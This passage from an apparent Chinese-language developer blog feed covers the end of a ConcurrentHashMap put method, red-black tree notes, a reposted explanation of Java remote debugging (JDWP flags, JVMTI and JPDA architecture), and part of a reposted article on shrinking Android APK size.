class="literal">null</span>)</span><br><span class="line">     <span class="keyword">return</span> oldVal;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">//给元素个数加 1，并有可能会触发扩容，比较复杂，稍后细讲</span></span><br><span class="line"> addCount(<span class="number">1L</span>, binCount);</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><ol>
<li><p>根节点叶子节点都是黑色 且 叶子都是 NIL 节点</p>
</li>
<li><p>路径上不能有两个连续的红色节点</p>
</li>
<li><p>从任一节点到其每个叶子的所有路径都包含相同数目的黑色节点</p>
</li>
</ol>
<blockquote>
<p>带来的效益：最长路径不会超过最短路径的两倍</p>
</blockquote>
<h5 id="变色-amp-旋转"><a href="#变色-amp-旋转" class="headerlink" title="变色 &amp; 旋转"></a>变色 &amp; 旋转</h5><blockquote>
<p>基础：红黑树的插入节点都是红色的</p>
</blockquote>
<ol>
<li><p>变色</p>
<ul>
<li>红变黑或者黑变红，变化过程可能会发生连锁反应</li>
</ul>
</li>
<li><p>旋转</p>
<ul>
<li>逆时针旋转，即父节点抢了右子节点的左儿子作为自己的右儿子，然后自己去认右子节点为爹。如图</li>
</ul>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/08/09/HashMap/left-rotation.png"
                      class="" title="left-rotation"
                >
<ul>
<li>顺时针旋转，上面的左右互换即可。即父节点抢了左子节点的右儿子作为自己的左儿子，然后自己去认右子节点为爹。</li>
</ul>
</li>
<li><p>应用</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Algorithm</tag>
        <tag>HashMap</tag>
        <tag>Concurrent Hash Map</tag>
      </tags>
  </entry>
  <entry>
    <title>（转）Java Debug</title>
    <url>/2020/07/04/Java-Debug/</url>
    <content><![CDATA[<h2 id="Debug-基础知识笔记-一"><a href="#Debug-基础知识笔记-一" class="headerlink" title="Debug 基础知识笔记 (一)"></a>Debug 基础知识笔记 (一)</h2><p>JDK 1.4.x:<br>    -Xdebug -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</p>
<p>JDK5-8:<br>    -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</p>
<p>JDK9 or later:<br>    -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;*:5005</p>
<p>远程 debug 的机理大致猜一下应该也就是客户端和远程虚拟机建立socket链接，然后通过约定的协议来进行数据的交互进而执行各自的功能逻辑。</p>
<p>从命令上也看的出来一些端倪：1.4 到 8 Xdebug 和 agentlib 转换其实类似个语法糖的转换，无关紧要。<br>（查了下 hotspot jdk8 source code 大致是在parse_each_vm_init_arg这个函数里进行的解析，看函数名猜下就是 vm 初始化参数）。<br>然后 debug 挂起模式（这个参数设置为 y 的时候一般是针对无法启动项目的 debug），地址， 端口大意都能理解。那么好奇就在于解析的这个 jdwp 是个啥了。</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// openjdk\hotspot\src\share\vm\runtime\arguments.cpp 2597 parse_each_vm_init_arg</span></span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">match_option</span>(option, <span class="string">&quot;-agentlib:&quot;</span>, &amp;tail) ||</span><br><span class="line">          (is_absolute_path = <span class="built_in">match_option</span>(option, <span class="string">&quot;-agentpath:&quot;</span>, &amp;tail))) &#123;</span><br><span class="line">      <span class="keyword">if</span>(tail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ... 处理字符串解析路径参数</span><br><span class="line">        <span class="keyword">if</span>(pos != <span class="literal">NULL</span>) &#123;</span><br><span class="line">          options = <span class="built_in">strcpy</span>(<span class="built_in">NEW_C_HEAP_ARRAY</span>(<span class="type">char</span>, <span class="built_in">strlen</span>(pos + <span class="number">1</span>) + <span class="number">1</span>, mtInternal), pos + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !INCLUDE_JVMTI</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">valid_hprof_or_jdwp_agent</span>(name, is_absolute_path)) &#123;</span><br><span class="line">          <span class="built_in">jio_fprintf</span>(defaultStream::<span class="built_in">error_stream</span>(),</span><br><span class="line">            <span class="string">&quot;Profiling and debugging agents are not supported in this VM\n&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> JNI_ERR;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !INCLUDE_JVMTI</span></span></span><br><span class="line">        <span class="built_in">add_init_agent</span>(name, options, is_absolute_path);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">add_init_agent</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name, <span class="type">char</span>* options, <span class="type">bool</span> absolute_path)</span></span></span><br><span class="line"><span class="function">    </span>&#123; _agentList.<span class="built_in">add</span>(<span class="keyword">new</span> <span class="built_in">AgentLibrary</span>(name, options, absolute_path, <span class="literal">NULL</span>)); &#125;</span><br><span class="line"></span><br><span class="line">    解析出来的agent 会被添加到 agentlist 中去</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>上述结束后， jvm 在启动时回去判断这个list 是不是空的，不为空，就加载他们并执行 agentOnLoad 函数进而执行真正的 agent 功能逻辑</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arguments::<span class="built_in">init_agents_at_startup</span>()) &#123;</span><br><span class="line">    <span class="built_in">create_vm_init_agents</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Threads::create_vm_init_agents</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  AgentLibrary* agent;</span><br><span class="line">  <span class="keyword">for</span> (agent = Arguments::<span class="built_in">agents</span>(); agent != <span class="literal">NULL</span>; agent = agent-&gt;<span class="built_in">next</span>()) &#123;</span><br><span class="line">    OnLoadEntry_t  on_load_entry = <span class="built_in">lookup_agent_on_load</span>(agent);</span><br><span class="line">    <span class="keyword">if</span> (on_load_entry != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="comment">// 反射调用AgentOnLoad </span></span><br><span class="line">      jint err = (*on_load_entry)(&amp;main_vm, agent-&gt;<span class="built_in">options</span>(), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>看下 agentOnLoad的注释，大致是说在动态链接库被加载时会立刻调用【即动态链库加载后执行的第一个方法】</p>
<blockquote>
<p>重点类 JPLISAgent（Java Programming Language Instrumentation Services Agent），它的作用是初始化所有通过Java Instrumentation API编写的Agent，并且也承担着通过JVMTI实现Java Instrumentation中暴露API的责任。</p>
</blockquote>
<p>在JVM启动的时候，JVM会通过-javaagent参数加载Agent。最开始加载的是libinstrument动态链接库，然后在动态链接库里面找到JVMTI的入口方法：Agent_OnLoad。下面就来分析一下在libinstrument动态链接库中，Agent_OnLoad函数是怎么实现的。</p>
<p>Attach机制的奥秘所在，也就是Attach Listener线程的创建依靠Signal Dispatcher线程，Signal Dispatcher是用来处理信号的线程，当Signal Dispatcher线程接收到“SIGBREAK”信号之后，就会执行初始化Attach Listener的工作。</p>
<p>debug 概览：</p>
<h2 id="JPDA-体系概览"><a href="#JPDA-体系概览" class="headerlink" title="JPDA 体系概览"></a>JPDA 体系概览</h2><ol>
<li>JVMTI 实际调用的方法，相当于 元命令【获取及控制当前虚拟机状态】</li>
</ol>
<p>JVMTI（Java Virtual Machine Tool Interface）即指 Java 虚拟机工具接口，它是一套由虚拟机直接提供的 <code>native</code> 接口，它处于整个 JPDA 体系的最底层，所有调试功能本质上都需要通过 JVMTI 来提供。通过这些接口，开发人员不仅调试在该虚拟机上运行的 Java 程序，还能查看它们运行的状态，设置回调函数，控制某些环境变量，从而优化程序性能。</p>
<ol start="2">
<li>JDWP 类似 Model 模型数据，作为中间数据转换，用来兼容双向接口 【定义 JVMTI 和 JDI 交互的数据格式】</li>
</ol>
<p>JDWP（Java Debug Wire Protocol）是一个为 Java 调试而设计的一个通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。在 JPDA 体系中，作为前端（front-end）的调试者（debugger）进程和后端（back-end）的被调试程序（debuggee）进程之间的交互数据的格式就是由 JDWP 来描述的，它详细完整地定义了请求命令、回应数据和错误代码，保证了前端和后端的 JVMTI 和 JDI 的通信通畅。比如在 Sun 公司提供的实现中，它提供了一个名为 jdwp.dll（jdwp.so）的动态链接库文件，这个动态库文件实现了一个 Agent，它会负责解析前端发出的请求或者命令，并将其转化为 JVMTI 调用，然后将 JVMTI 函数的返回值封装成 JDWP 数据发还给后端。</p>
<p>另外，这里需要注意的是 JDWP 本身并不包括传输层的实现，传输层需要独立实现，但是 JDWP 包括了和传输层交互的严格的定义，就是说，JDWP 协议虽然不规定我们是通过 EMS 还是快递运送货物的，但是它规定了我们传送的货物的摆放的方式。在 Sun 公司提供的 JDK 中，在传输层上，它提供了 socket 方式，以及在 Windows 上的 shared memory 方式。当然，传输层本身无非就是本机内进程间通信方式和远端通信方式，用户有兴趣也可以按 JDWP 的标准自己实现。</p>
<ol start="3">
<li>JDI 相当于 java 层面的封装工具，便于使用 JVMTI 和 格式话 JDWP 数据 【提供 Java API 来远程控制被调试虚拟机】</li>
</ol>
<p>JDI（Java Debug Interface）是三个模块中最高层的接口，在多数的 JDK 中，它是由 Java 语言实现的。 JDI 由针对前端定义的接口组成，通过它，调试工具开发人员就能通过前端虚拟机上的调试器来远程操控后端虚拟机上被调试程序的运行，JDI 不仅能帮助开发人员格式化 JDWP 数据，而且还能为 JDWP 数据传输提供队列、缓存等优化服务。从理论上说，开发人员只需使用 JDWP 和 JVMTI 即可支持跨平台的远程调试，但是直接编写 JDWP 程序费时费力，而且效率不高。因此基于 Java 的 JDI 层的引入，简化了操作，提高了开发人员开发调试程序的效率。</p>
<p>以 C&#x2F;C++ 的调试为例，它们 Debugger 本身事实上是提供了，或者说，创建和管理了一个运行态，因此他们的程序算法比较复杂，个头都比较大。</p>
<p>而 Java 的可控的运行态明显就是虚拟机。 Java 的 JPDA 就是一套为调试和优化服务的虚拟机的操作工具，其中，JVMTI 是整合在虚拟机中的接口，JDWP 是一个通讯层，而 JDI 是前端为开发人员准备好的工具和运行库。</p>
<p>从构架上说，我们可以把 JPDA 看作成是一个 C&#x2F;S 体系结构的应用，在这个构架下，我们可以方便地通过网络，在任意的地点调试另外一个虚拟机上的程序，这个就很好地解决了部署和测试的问题，尤其满足解决了很多网络时代中的开发应用的需求。前端和后端的分离，也方便用户开发适合于自己的调试工具。</p>
<p>从效率上看，由于 Java 程序本身就是编译成字节码，运行在虚拟机上的，因此调试前后的程序、内存占用都不会有大变化（仅仅是启动一个 JDWP 所需要的内存），任意程度都可以很好地调试，非常方便。而 JPDA 构架下的几个组成部分，JDWP 和 JDI 都比较小，主要的工作可以让虚拟机自己完成。</p>
<p>从灵活性上，Java 调试工具是建立在强大的虚拟机上的，因此，很多前沿的应用，比如动态编译运行，字节码的实时替换等等，都可以通过对虚拟机的改进而得到实现。随着虚拟机技术的逐步发展和深入，各种不同种类，不同应用领域中虚拟机的出现，各种强大的功能的加入，给我们的调试工具也带来很多新的应用。</p>
<p>总而言之，一个先天的，可控的运行态给 Java 的调试工作，给 Java 调试接口带来了极大的优势和便利。通过 JPDA 这个标准，我们可以从虚拟机中得到我们所需要的信息，完成我们所希望的操作，更好地开发我们的程序。</p>
<h2 id="JVMTI-和-Agent-实现"><a href="#JVMTI-和-Agent-实现" class="headerlink" title="JVMTI 和 Agent 实现"></a>JVMTI 和 Agent 实现</h2><p>在 Java 程序运行的过程中，程序员希望掌握它总体的运行状况，这个时候程序员可以直接使用 JDK 提供的 jconsole 程序。如果希望提高程序的执行效率，开发人员可以使用各种 Java Profiler。OutOfMemoryError）等等，这时可以把当前的内存输出到 Dump 文件，再使用堆分析器或者 Dump 文件分析器等工具进行研究，查看当前运行态堆（Heap）中存在的实例整体状况来诊断问题。</p>
<p>上述情况的共同点，与虚拟机交互来获取信息</p>
<p>JVMTI 是一套本地代码接口，因此使用 JVMTI 需要我们与 C&#x2F;C++ 以及 JNI 打交道。事实上，开发时一般采用建立一个 Agent 的方式来使用 JVMTI，它使用 JVMTI 函数，设置一些回调函数，并从 Java 虚拟机中得到当前的运行态信息，并作出自己的判断，最后还可能操作虚拟机的运行态。把 Agent 编译成一个动态链接库之后，我们就可以在 Java 程序启动的时候来加载它（启动加载模式），也可以在 Java 5 之后使用运行时加载（活动加载模式）。</p>
<h2 id="Agent-Working-process"><a href="#Agent-Working-process" class="headerlink" title="Agent Working process"></a>Agent Working process</h2><p>Agent 是在 Java 虚拟机启动之时加载的，这个加载处于虚拟机初始化的早期</p>
<p>可以做的事： 操作 JVMTI 的 Capability 参数【就是事件回调绑定的说明，通过这个参数来说明发生事件时对应的回调，其实也就是JVMTI的主要工作方式】； 使用系统参数；前面提到动态库加载后会调用 <code>Agent_OnLoad(JavaVM *vm, char *options, void *reserved)</code>，传入的第一个虚拟机参数就可以拿到需要的VM，进而获取到对应的 <code>JVMTI</code> 来使用。第二个参数就是命令行参数：该参数在结束ONLoad后会被清空。第三个是版本信息。<br>tips： 版本信息参数会影响到不同的虚拟机实现。另外此时并非所有的JVMTI函数都可用，部分受限于尚未完成的初始化工作(其实JVMTI 的函数调用都有其时间性，即特定的函数只能在特定的虚拟机状态下才能调用，比如 SuspendThread（挂起线程）这个动作，仅在 Java 虚拟机处于运行状态（live phase）才能调用，否则导致一个内部异常。)。</p>
<p>标准的 jvmtiCapabilities 定义了一系列虚拟机的功能，比如 can_redefine_any_class 定义了虚拟机是否支持重定义类，can_retransform_classes 定义了是否支持在运行的时候改变类定义等等。</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">err = (*jvmti)-&gt;<span class="built_in">GetCapabilities</span>(jvmti, &amp;capa); <span class="comment">// 取得 jvmtiCapabilities 指针。</span></span><br><span class="line"> <span class="keyword">if</span> (err == JVMTI_ERROR_NONE) &#123; </span><br><span class="line">       <span class="keyword">if</span> (capa.can_redefine_any_class) &#123; ... &#125; </span><br><span class="line">       &#125; <span class="comment">// 查看是否支持重定义类</span></span><br></pre></td></tr></table></figure></div>

<p>jVMTI 的工作模式就是根据已有定义的事件配置回调来完成触发动作实现 </p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">jvmtiEventCallbacks eventCallBacks; </span><br><span class="line"><span class="built_in">memset</span>(&amp;ecbs, <span class="number">0</span>, <span class="built_in">sizeof</span>(ecbs)); <span class="comment">// 初始化</span></span><br><span class="line">eventCallBacks.ThreadStart = &amp;HandleThreadStart; <span class="comment">// 设置函数指针</span></span><br><span class="line"><span class="comment">// 上面  写定了一个 线程启动事件绑定的回调函数，然后将其注册到设置中即可，如下</span></span><br><span class="line">jvmti-&gt;<span class="built_in">SetEventCallbacks</span>(eventCallBacks, <span class="built_in">sizeof</span>(eventCallBacks));</span><br></pre></td></tr></table></figure></div>

<h2 id="JDWP-及实现"><a href="#JDWP-及实现" class="headerlink" title="JDWP 及实现"></a>JDWP 及实现</h2><p>JDWP 有两种基本的包（packet）类型：命令包（command packet）和回复包（reply packet）。</p>
<p>Debugger 通过发送 command packet 获取 target Java 虚拟机的信息以及控制程序的执行。Target Java 虚拟机通过发送 command packet 通知 debugger 某些事件的发生，如到达断点或是产生异常。</p>
<p>Reply packet 是用来回复 command packet 该命令是否执行成功，如果成功 reply packet 还有可能包含 command packet 请求的数据，比如当前的线程信息或者变量的值。从 target Java 虚拟机发送的事件消息是不需要回复的。</p>
<p>还有一点需要注意的是，JDWP 是异步的：command packet 的发送方不需要等待接收到 reply packet 就可以继续发送下一个 command packet。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Debug</tag>
        <tag>JDWP</tag>
      </tags>
  </entry>
  <entry>
    <title>(转)Android-Compress</title>
    <url>/2017/09/10/andrid-compress/</url>
    <content><![CDATA[<blockquote>
<p>本文由 <a class="link"   href="http://ksria.com/simpread/" >简悦 SimpRead<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 转码， 原文地址 <a class="link"   href="https://zhuanlan.zhihu.com/p/23882195?utm%5C_medium=social&utm%5C_source=qq" >https://zhuanlan.zhihu.com/p/23882195?utm\_medium=social&amp;utm\_source=qq<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h2 id="1、我是怎么思考这件事情的"><a href="#1、我是怎么思考这件事情的" class="headerlink" title="1、我是怎么思考这件事情的"></a><strong>1、我是怎么思考这件事情的</strong></h2><p>APK 是 Android 系统安装包的文件格式，关于这个话题其实是一个老生常谈的题目，不论是公司内部，还是外部网络，前人前辈已经总结出很多方法和规律。不过随着移动端技术近两年的飞速发展，一些新的思维方式和优化方法也逐渐涌现和成熟起来。笔者在实践过程中踩过一些坑，收获了一些经验，在这里做个思考和总结，所以随笔给大家，希望对大家从事相关工作的时候有所帮助和参考，同时也是抛砖引玉，希望大家共同探讨这个开放性的话题。 关于为什么 APK 要瘦身，这个不多说，只从三个方面唠叨一下，对于用户（或者客户）来说，APK 越大，在下载安装过程中，他们耗费的流量会越多，安装等待时间也会越长；对于产品本身，意味着下载转化率会越低（因为竞品中，用户有更多机会选择那个体验最好，功能最多，性能最好，包最小的）；对于研发来说，是一种优化改进技术的机会。 欲瘦身，我们先找找胖的原因和问题。按目标－路径－资源的思维模式，找原因和问题有如下几条路径，一是拍脑袋，按自己的经验和判断，甚至是主观想象；二是去搜索引擎找关键字，逛各种技术论坛听技术大牛们怎么说，看各类技术文章抽取提炼；三是用一种可测量的工具或者方法发现问题。 前两种不赘述，我这里说说第三种方法。用一种可测量的工具或者方法来分析，所谓工欲善其事，必先利其器。这个器可以可以自己锻造，也可以用现成的。这里推荐一个在线 apk 分析工具，因为是外部工具，所以大家请在使用过程中，不要上传未发布出去的产品，为了数据安全，笔者这里拿一个 github 上开源的 Android 项目作为瘦身示例。</p>
<h2 id="2、寻找问题"><a href="#2、寻找问题" class="headerlink" title="2、寻找问题"></a><strong>2、寻找问题</strong></h2><p><a class="link"   href="http://link.zhihu.com/?target=https://nimbledroid.com/" >NimbleDroid<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 是美国哥伦比亚大学的博士创业团队研发出来的分析 Android app 性能指标的系统，分析的方式有静态和动态两种方式，其中静态分析可以分析出 APK 安装包中大文件排行榜，各种知名 SDK 的大小以及占代码整体的比例，各种类型文件的大小以及占排行，各种知名 SDK 的方法数以及占所有 dex 中方法数的比例，废话不多说，下面上高清无码大图看看颜值吧。 如果想使用分析功能分析自己的产品，请登录并上传自己产品的 apk 包，所有功能目前均免费使用，如果是想分析 Google Play 上已经发布的产品，可以直接点击 “Play Apps” 查看，还可以使用搜索功能根据应用名和包名查看结果。再次强调下，请不要上传任何未发布的产品。 登录 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/v2-657b86553ac315c306f5a0526d354f74_b.png"
                     
                > 上传 apk 文件 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/v2-1acf01deae8021e35150e25b5361564e_b.png"
                     
                > 分析结果摘要，可以看到一些概览的信息，apk 文件大小，总的方法数 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/v2-56c61cc5330515c19daf696bd3bb0a1a_b.png"
                     
                > 文件大小分析详情页，大文件列表，这里列出的是 apk 文件中超过 100k 的文件排行，这里的文件大小指的是 apk 文件中的大小 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic4.zhimg.com/v2-8e94e91548801e25f7da4014dc714a7b_b.png"
                     
                > 各种知名 SDK 的大小以及占代码整体的比例，这里目前能识别出 Android Support，Jackson JSON parser, Google Play Services, Paypal, Glide, OkHttp, Facebook SDK, Fabric, Gson 等等，Application 表示 App 中自己编写的代码部分 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic2.zhimg.com/v2-afaaed41cfb3a694efaca3f29bbd1cf1_b.png"
                     
                > 各种类型文件的大小以及排行 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic2.zhimg.com/v2-c49890086b1bee278065c9c97dc4225d_b.png"
                     
                > 各种知名 SDK 占所有 dex 中方法数的比例 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/v2-37f6ab3eb1192fcfc2c252e0b21885ce_b.png"
                     
                > 各种知名 SDK 的方法数排行榜 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic4.zhimg.com/v2-7d35255e0db25ac6df9d677e7524bee3_b.png"
                     
                > 看完这个 apk 内剖图是不是有一种神清气爽的感觉！我把这个分析工具比做我们家买的智能体重秤，可以称体重，脂肪含量，骨重，骨密度，肌肉含量等等，那么，我们是不是发现了一些问题，进而把这些问题和我们之前靠经验和一拍脑袋的原因可以用逻辑联系在一起。 那么，我们接下来可以通过分析数据整理出我们的优化目标</p>
<ol>
<li><p>大文件排行榜里，有 11 张 png 文件的大小超过了 100k，记住，这可是压缩之后的啊；</p>
</li>
<li><p>大文件排行榜里，resources.arsc 的大小接近 2M，这也是一个优化点；</p>
</li>
<li><p>大文件排行榜里，classes.dex 接近 3M，classes.dex 是代码的载体，这块的优化需要细分，再去看看细分 SDK 的排行榜；</p>
</li>
<li><p>组件占比环图里，Android Support, Jackson JSON Parser 和 Google Play Services 是三方库的前三甲；</p>
</li>
<li><p>文件类型排行榜里，png, dex 和 arsc 是前三甲；</p>
</li>
</ol>
<h2 id="3、梳理优化目标"><a href="#3、梳理优化目标" class="headerlink" title="3、梳理优化目标"></a><strong>3、梳理优化目标</strong></h2><p>所以我们的目标是没有蛀牙，不对，是下面的目标：</p>
<ol>
<li><p>png 图片优化；</p>
</li>
<li><p>resources.arsc 文件的优化；</p>
</li>
<li><p>代码优化</p>
</li>
</ol>
<p><strong>3.1</strong> <strong>图片优化的尝试</strong> 首先是第一个目标，图片的优化，慢点，我们看看这些图为什么这么大先，准确的说，为什么这些图在 apk（其实就是 zip 文件）里这么大，好了，上工具分析。 这次用了一些简单的工具组合，系统自带的 cmd 就好。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/v2-fb7f2bcbfdbeda14424c61b34c1d87f4_b.jpg"
                     
                > 命令执行的结果如下 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/v2-3b34d466461761c9295df07b19898fe4_b.png"
                     
                > 恩，所有的 png 文件居然是 STORE 的方式存储到 apk 里的，关于 zip 里的 STORE 和 DEFLATE，<a class="link"   href="http://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Zip_(file_format" >详见<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ) 通俗的说，当文件是 STORED 的方式存储到 zip，表示这个文件并没有经过压缩，如果是 Defl:N 的方式，表示通过 DEFLATED normal 的方式压缩存储到 zip。 这看起来有点不合理，png 原封不动的放入 zip，当然最后产出的 apk 会比较大。那么，如何解决呢？笔者首先尝使用 android gradle plugin 的方式，发现 aaptOptions 和 packagingOptions 都未能解决问题。在 github 上发现一个开源项目 <a class="link"   href="http://link.zhihu.com/?target=https://github.com/shwenzhang/AndResGuard" >AndResGuard<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，试了集成到项目中，再看结果如下： 优化前： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/v2-cb4b29357178a21f6cf57252f21a97b8_b.png"
                     
                > 10536027 字节 优化后： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic2.zhimg.com/v2-fb6582098e9028f72b9c0c5732e75d2d_b.png"
                     
                > 普通 zip 压缩： 8786265 字节 （压缩了将近 17%） 采用 7zip 压缩：8567150 字节 （压缩了将近 19%） 再看看这个工具做了什么，对比下开启资源混淆前后 优化前 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/v2-1e2c8ff9fde5b41f438bc731b7910450_b.png"
                     
                > 优化后 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/v2-8849961c9ec8cc17ffbd662dd12e8cf8_b.png"
                     
                ></p>
<ol>
<li><p>资源（png, xml, jpg 等）名称混淆，资源路径名称混淆以及名称长度压缩；</p>
</li>
<li><p>原来以 STORED 形式存储到 zip 中的 png 文件被改成了 DEFLATED（普通压缩存储）方式；</p>
</li>
<li><p>意外发现 resources.arsc, META-INF&#x2F;<em>.SF 以及 META-INF&#x2F;</em>.MF 变小了，而且是解压之后的文件大小也变小了。</p>
</li>
</ol>
<p>用 apk 反编译神器 <a class="link"   href="http://link.zhihu.com/?target=https://github.com/skylot/jadx.git" >jadx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>内窥 apk 寻找真相 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic4.zhimg.com/v2-22d4434479b7113c1d0ef44906f639f3_b.png"
                     
                > 原来 apk 中资源（png, xml，以及 properties 文件）的相对路径会存放到 META-INF&#x2F;<em>.SF 以及 META-INF&#x2F;</em>.MF 中并为每个资源文件计算 SHA1 值并存储在这两个文件中，至于为啥这么做以及这两个 SHA1 有啥区别和作用请参考网络上关于这方面知识的文章，已超出本文的主题所以这里不再赘述。 对于 resources.arsc 文件 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic4.zhimg.com/v2-9d5a0bfba7c0d28d0be88df0734ea3eb_b.png"
                     
                > 很容易看出来它是资源文件索引表，所以，看到这里大家应该明白这三个文件为啥会变小了吧。 <strong>3.2</strong> <strong>一次意外的发现</strong> 顺着 resources.arsc 往下看，发现一个有趣的东西， <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/v2-6b78a128a64725563df614fbe00be1ea_b.png"
                     
                > 这又将成为一个优化点，去除那些没用的翻译资源，引入一些第三方的 SDK，往往这些 SDK 带了很多翻译资源在里面，比如 android support 库，去掉后我们来看看效果。 假设我们只保留英文，当然只是个实验，现实中看具体情况了， 采用 7zip 压缩：8220738 字节 （压缩了将近 22%，再增加 3 个点） 当然，真实的项目里不可能这样，但是蚊子肉也是肉啊！ 其实，我想说的是这提供了一种优化思路，就是利用 gradle 的配置干掉无用的资源，同样的可以用在 so 本地库上，分辨率（gradle 配置已 deprecated）上。 gradle 配置示例如下： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/v2-18536ee0c51bccb150e65ebec348e7b8_b.jpg"
                     
                > 记得包在 android{} 中间哦。那么，有人要问了，abi 里肿么没有 x86？据说 intel 提供了一个解决方案叫 houdini，是一个运行在 x86 设备上的中间件，可以将 arm 转码为 x86 的指令，不过效率很低，有些运算型的，比如计算 MD5 和 SHA1，甚至不如 java，笔者曾经做过测试对比，又是另外一个话题，此处不赘述，感兴趣的读者可以移步。 到此为止，我们已经在朝第一个目标迈进，不经意间发现了第一个目标和第二个目标之间的关系，所以利用资源混淆工具，达成了第二个目标。 利用 7zip 压缩，我们对整个包进行了 2 个点的压缩，这是一个超出预期的成果。 <strong>3.3</strong> <strong>图片优化的方法</strong> 关于第一个目标，我们的路径还没有结束，拍脑袋想出来的路径是压缩 png，非 alpha 图转成 jpg，还有什么？所以去各种技术论坛逛了一圈，请教了各种技术大牛，梳理的路径如下： 1、手动 lint 检查，手动删除代码中没有引用到的资源，实际效果不等。 在 Android Studio 中打开 “Analyze” 然后选择 “Inspect Code…”，范围选择整个项目，然后点击 “OK” 配置如下图 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/v2-7147bb5b4c9eead2db46cc6cb8974dfc_b.png"
                     
                > 2、gradle 脚本中开启 shrinkResources 脚本参考如下 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic2.zhimg.com/v2-426f6193ca739c1cbf9bbd5f49483779_b.jpg"
                     
